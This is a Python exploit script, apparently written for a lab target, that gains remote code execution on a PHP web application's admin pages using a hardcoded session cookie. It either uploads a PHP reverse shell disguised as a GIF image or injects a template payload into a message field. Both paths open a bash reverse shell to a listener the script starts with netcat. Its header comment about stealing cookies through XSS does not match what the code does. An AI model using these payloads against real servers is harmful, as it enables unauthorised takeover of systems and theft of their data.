# Steal admin cookie by putting a XSS on user profile

import urllib3
import sys
import requests
import subprocess
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

phpsessid = "cn2q99jq4u0ho8cktj2suq59ep"

if len(sys.argv) != 3:
    print("Usage: %s <IP> <OPTION>" % sys.argv[0])
    print("Example: %s 172.17.0.2 image" % sys.argv[0])
    print("The options are: image or ssti")

session = requests.Session()

cookies = {"PHPSESSID":phpsessid}

## Functions

def fileUpload(uploadURL):

    # Image with reverse shell
    shellFile = {
		'image':('shell.phar', "GIF98a;<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.159.131/9000 0>&1'\");?>",'image/gif'),
		'title':(None,"shell.phar")
	}

    rUpload = session.post(uploadURL, verify=False, proxies=proxies, files=shellFile, cookies=cookies, allow_redirects=False)
    return "Success" in rUpload.text

def updateMessage(motdURL):

    messageData = {'message': "{php}exec(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.159.131/9000 0>&1'\");{/php}"}
    rMessage = session.post(motdURL, verify=False, proxies=proxies, data=messageData, cookies=cookies, allow_redirects=False)
    return "Message set!" in rMessage.text

##################

url = sys.argv[1]

rce = sys.argv[2]

if rce == "image":
    uploadURL = "http://" + url + "/admin/upload_image.php"

    if fileUpload(uploadURL):
        print("[+] File shell.phar uploaded!")
    else:
        print("[!] Fail to upload, exiting...")
        exit()

    filePath = "http://" + url + "/images/shell.phar"

    print("[+] Getting reverse shell...")

    subprocess.Popen(["nc","-nvlp","9000"])
    time.sleep(1)

    rFile = session.get(filePath, verify=False, proxies=proxies, cookies=cookies, allow_redirects=False)

elif rce == "ssti":

    motdURL = "http://" + url + "/admin/update_motd.php"

    mainURL = "http://" + url

    if updateMessage(motdURL):
        print("[+] Message updated")
    else:
        print("[!]Fail to update message")
        exit()

    print("[+] Getting reverse shell...")

    subprocess.Popen(["nc","-nvlp","9000"])
    time.sleep(1)

    rFile = session.get(mainURL, verify=False, proxies=proxies, cookies=cookies, allow_redirects=False)

else:
    print("[!] Invalid option")



